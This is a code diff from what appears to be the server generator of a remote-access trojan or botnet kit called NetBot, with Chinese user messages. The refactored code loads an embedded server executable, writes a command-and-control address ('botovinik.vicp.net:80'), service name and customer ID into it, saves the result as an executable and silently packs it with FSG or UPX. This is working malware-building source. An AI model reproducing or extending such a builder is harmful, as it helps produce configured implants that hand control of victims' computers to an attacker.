@@ -25,7 +25,7 @@ struct MODIFY_DATA
 }modify_data =
 {
     "botovinik.vicp.net:80",
-	"111118",
+	"150628",
 	vipid,
 	FALSE,
 	"WinNetCenter",
@@ -80,10 +80,10 @@ void CServerDlg::ReadIniFile()
 	char Path[255];
     GetCurrentDirectory(255, Path);
 	CString path;
-	path.Format("%s\\NetBot.ini",Path);
+	path.Format("%s\\NetBot.ini", Path);
 	if(m_Ini.SetPath(path))
 	{
-		m_Url =m_Ini.GetKeyValue("Server Setting","IPFile");
+		m_Url = m_Ini.GetKeyValue("Server Setting", "IPFile");
 	}
 }
 
@@ -136,7 +136,7 @@ BOOL CServerDlg::OnInitDialog()
 
 int MemFindStr(const char *strMem, const char *strSub, int iSizeMem, int isizeSub)   
 {   
-	int   len,i;   
+	int len,i;   
 	
 	if (isizeSub == 0) 
 	{
@@ -149,7 +149,7 @@ int MemFindStr(const char *strMem, const char *strSub, int iSizeMem, int isizeSu
 
 	for (i = 0; i < iSizeMem; i++)   
 	{   
-		if(memcmp(strSub,strMem+i,len)==0)
+		if(memcmp(strSub, strMem+i, len) == 0)
 		{
 			return i;
 		}	
@@ -158,88 +158,91 @@ int MemFindStr(const char *strMem, const char *strSub, int iSizeMem, int isizeSu
 	return -1;   
 }
 
-void CServerDlg::CompressFsg()
+int LoadRes(LPBYTE *Mem, DWORD id)
 {
 	HRSRC hResInfo;
 	HGLOBAL hResData;
-	DWORD dwSize,dwWritten;
-	LPBYTE p;
-	HANDLE hFile;
-    // 查找所需的资源
-	hResInfo = FindResource(NULL,MAKEINTRESOURCE(IDR_FSG),"EXE");
+	DWORD dwSize;
+	
+	hResInfo = FindResource(NULL,MAKEINTRESOURCE(id),"EXE");
 	if(hResInfo == NULL)
-		return;
-    // 获得资源尺寸
+	{
+		Msg("Can't Find Resource.");
+		return -1;
+	}
+	
 	dwSize = SizeofResource(NULL,hResInfo);
-    // 装载资源
+	
 	hResData = LoadResource(NULL,hResInfo);
 	if(hResData == NULL)
-		return;
-	// 为数据分配空间
-	p = (LPBYTE)GlobalAlloc(GPTR, dwSize); 
-	if (p == NULL)    
-		return;
-	// 复制资源数据
-	CopyMemory((LPVOID)p, (LPCVOID)LockResource(hResData), dwSize);
+	{
+		Msg("Can't Load Resource.");
+		return -1;
+	}
+	
+	*Mem = (LPBYTE)GlobalAlloc(GPTR, dwSize); 
+	if (*Mem == NULL)    
+	{
+		Msg("Can't Allocate Memory.");
+		return -1;
+	}
+	
+	CopyMemory((LPVOID)*Mem, (LPCVOID)LockResource(hResData), dwSize);
 
-    char fsgPath[256];
-    GetCurrentDirectory(256, fsgPath);
-	strcat(fsgPath,"\\fsg.exe");
-	DeleteFile(fsgPath);
-	hFile = CreateFile(fsgPath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
+	return dwSize;
+}
+
+int ResToFile(char Path[], DWORD id)
+{
+	LPBYTE p;
+	HANDLE hFile;
+	DWORD dwSize,dwWritten;
+
+	dwSize = LoadRes(&p, id);
+	
+	DeleteFile(Path);
+	hFile = CreateFile(Path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
 	if(hFile == NULL)
-		return;
+	{
+		GlobalFree(p);
+		Msg("Can't Write file.");
 
-	WriteFile(hFile,(LPVOID)p,dwSize,&dwWritten,NULL);
+		return 1;
+	}
+	
+	WriteFile(hFile, (LPVOID)p, dwSize, &dwWritten, NULL);
 	CloseHandle(hFile);
+	GlobalFree(p);
 
-	HANDLE hfsg = ShellExecute(this->m_hWnd,"open",fsgPath,Path ,"",SW_HIDE);
+	return 0;
+}
 
+int CServerDlg::Compress(char File[])
+{
+    char PackerPath[256];
+    GetCurrentDirectory(256, PackerPath);
+	lstrcat(PackerPath, File);
+	DeleteFile(PackerPath);
+	
+	ResToFile(PackerPath, IDR_FSG);
+	
+	HANDLE hfsg = ShellExecute(this->m_hWnd, "open", PackerPath, Path , "", SW_HIDE);
+	
 	WaitForSingleObject(hfsg,2000);
 	
 	TerminateProcess(hfsg,0);
 	
-	DeleteFile(fsgPath);
+	return DeleteFile(PackerPath);
+}
+
+void CServerDlg::CompressFsg()
+{
+    Compress("\\fsg.exe");
 }
 
 void CServerDlg::CompressUpx()
 {
-	HRSRC hResInfo;
-	HGLOBAL hResData;
-	DWORD dwSize,dwWritten;
-	LPBYTE p;
-	HANDLE hFile;
-    // 查找所需的资源
-	hResInfo = FindResource(NULL,MAKEINTRESOURCE(IDR_UPX),"EXE");
-	if(hResInfo == NULL) return;
-    // 获得资源尺寸
-	dwSize = SizeofResource(NULL,hResInfo);
-    // 装载资源
-	hResData = LoadResource(NULL,hResInfo);
-	if(hResData == NULL) return;
-	// 为数据分配空间
-	p = (LPBYTE)GlobalAlloc(GPTR, dwSize); 
-	if (p == NULL)     return;
-	// 复制资源数据
-	CopyMemory((LPVOID)p, (LPCVOID)LockResource(hResData), dwSize);
-
-    char upxPath[256];
-    GetCurrentDirectory(256, upxPath);
-	lstrcat(upxPath,"\\upx.exe");
-	DeleteFile(upxPath);
-	hFile = CreateFile(upxPath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
-	if(hFile == NULL) return;
-
-	WriteFile(hFile,(LPVOID)p,dwSize,&dwWritten,NULL);
-	CloseHandle(hFile);
-
-	HANDLE hupx = ShellExecute( this->m_hWnd , "open" , upxPath , Path ,"",SW_HIDE);
-
-	WaitForSingleObject(hupx,2000);
-
-	TerminateProcess(hupx,0);
-
-	DeleteFile(upxPath);
+    Compress("\\upx.exe");
 }
 
 //////////////////////////////////////////////////////////////////////////////////////////////
@@ -249,21 +252,21 @@ void CServerDlg::OnOk()
 	// TODO: Add your control notification handler code here
 	UpdateData();
 
-	if(m_Url.GetLength()<2||m_Url.GetLength()>100)
+	if(m_Url.GetLength() < 2 || m_Url.GetLength() > 100)
 	{
-		m_LogList.InsertString(0,"提示:配置信息填写错误!");
+		m_LogList.InsertString(0, "提示:配置信息填写错误!");
 		return;
 	}
 	else
 	{
 		SYSTEMTIME localTime;
 		GetLocalTime(&localTime);
-		wsprintf(modify_data.strVersion,"Vip%d%02d%02d",localTime.wYear,localTime.wMonth,localTime.wDay);
-		lstrcpy(modify_data.strIPFile,m_Url);
+		wsprintf(modify_data.strVersion,"%d%02d%02d", localTime.wYear, localTime.wMonth, localTime.wDay);
+		lstrcpy(modify_data.strIPFile, m_Url);
 		modify_data.dwVipID = ((CNetBotApp*)AfxGetApp())->VipID;
 
-		lstrcpy(modify_data.ServerAddr,m_Url);
-		modify_data.ServerPort=atoi(m_port);
+		lstrcpy(modify_data.ServerAddr, m_Url);
+		modify_data.ServerPort = atoi(m_port);
 
 		lstrcpy(modify_data.strSvrName,m_ServiceName);
 		lstrcpy(modify_data.strSvrDisp,m_ServiceDisp);
@@ -274,88 +277,55 @@ void CServerDlg::OnOk()
 
 	GetDlgItem(IDC_CREATE)->EnableWindow(FALSE);
 
-	char dir[256];
+	char dir[256];	
+	GetCurrentDirectory(256, dir);
 	
-	GetCurrentDirectory(256,dir);
-	
-	CFileDialog   fdlg(FALSE, ".exe" , "nb.exe" , OFN_OVERWRITEPROMPT|OFN_EXPLORER|OFN_NOCHANGEDIR , "Executive Files (*.exe)|*.exe|All Files (*.*)|*.*||" , this ); 
+	CFileDialog fdlg(FALSE, ".exe", "nbs.exe", OFN_OVERWRITEPROMPT|OFN_EXPLORER|OFN_NOCHANGEDIR, "Executive Files (*.exe)|*.exe|All Files (*.*)|*.*||", this); 
 	
 	fdlg.m_ofn.lpstrInitialDir = dir;
 	
-	if(IDOK!=fdlg.DoModal())	//briken down here
+	if(IDOK != fdlg.DoModal()) //broken down here
 	{
 		return;
 	}
 
-	CString sz = fdlg.GetPathName();	//获取文件全路经
+	CString sz = fdlg.GetPathName();
 	if(sz == "" )
 	{
 		return;
 	}
-	strcpy(Path,sz);
+	lstrcpy(Path, sz);
 
-	/////////////////////////////////////////////////////////
-	
-	HRSRC hResInfo;
-	HGLOBAL hResData;
-	DWORD dwSize,dwWritten;
+	DWORD dwSize, dwWritten;
 	LPBYTE p;
 	HANDLE hFile;
-    // 查找所需的资源
-	hResInfo = FindResource(NULL,MAKEINTRESOURCE(IDR_EXE),"EXE");
-	if(hResInfo == NULL)
-	{
-		ErrMsg("Can't Find Resource.");
-		return;
-	}
 	
-    // 获得资源尺寸
-	dwSize = SizeofResource(NULL,hResInfo);
-    // 装载资源
-	hResData = LoadResource(NULL,hResInfo);
-	if(hResData == NULL)
-	{
-		ErrMsg("Can't load Resource.");
-		return;
-	}
-	
-	// 为数据分配空间
-	p = (LPBYTE)GlobalAlloc(GPTR, dwSize); 
-	if (p == NULL)   
-	{
-		ErrMsg("Can't Alooc memory.");
-		return;
-	}
-
-	// 复制资源数据
-	CopyMemory((LPVOID)p, (LPCVOID)LockResource(hResData), dwSize);
-
 	m_LogList.AddString("Load Resource...");
 
-	int iPos = 0;
+	dwSize = LoadRes(&p, IDR_EXE);
 
-	iPos=MemFindStr((const char *)p, "botovinik.vicp.net:80", dwSize, lstrlen("botovinik.vicp.net:80"));
+	int iPos = MemFindStr((const char *)p, "botovinik.vicp.net:80", dwSize, lstrlen("botovinik.vicp.net:80"));
 
-	if(iPos==0)
+	if(iPos == 0)
 	{
-		MessageBoxEx(NULL,"服务端读取错误!","Setup Server",0,0); 
+		MessageBoxEx(NULL, "服务端读取错误!", "Setup Server", 0, 0); 
 	}
 
-	CopyMemory((LPVOID)(p + iPos), (LPCVOID)&modify_data,sizeof(MODIFY_DATA)); //填充配置信息
+	CopyMemory((LPVOID)(p + iPos), (LPCVOID)&modify_data, sizeof(MODIFY_DATA)); //填充配置信息
 
 	m_LogList.AddString("Writing Config...");
 
 	DeleteFile(Path);
-	hFile = CreateFile(Path,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
+	hFile = CreateFile(Path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
 
 	if(hFile == NULL)
 	{
 		return;
 	}
-	
-	WriteFile(hFile,(LPVOID)p,dwSize,&dwWritten,NULL);
 
 	m_LogList.AddString("Writing File...");
+	
+	WriteFile(hFile, (LPVOID)p, dwSize, &dwWritten, NULL);
 
 	if(hFile)
 	{
@@ -374,8 +344,8 @@ void CServerDlg::OnOk()
 			CompressFsg();
 			break;
 		case 2:
-			CompressUpx();
 			m_LogList.AddString("Compressing...");
+			CompressUpx();
 			break;
 		case 3:
 			break;
@@ -386,12 +356,12 @@ void CServerDlg::OnOk()
 	m_LogList.AddString("Server Setup finished!");
 	m_ServerProgress.SetPos(100);
 
-	MessageBoxEx(NULL,"服务端生成完毕!","配服务端",0,0); 
+	MessageBoxEx(NULL, "服务端生成完毕!", "配服务端", 0, 0); 
 	
 	GetDlgItem(IDC_CREATE)->EnableWindow(TRUE); 	
 
 	UpdateData(FALSE);	
-	m_Ini.SetKeyValue("Server Setting","IPFile",m_Url);
+	m_Ini.SetKeyValue("Server Setting", "IPFile", m_Url);
 
 	CDialog::OnOK();
 }
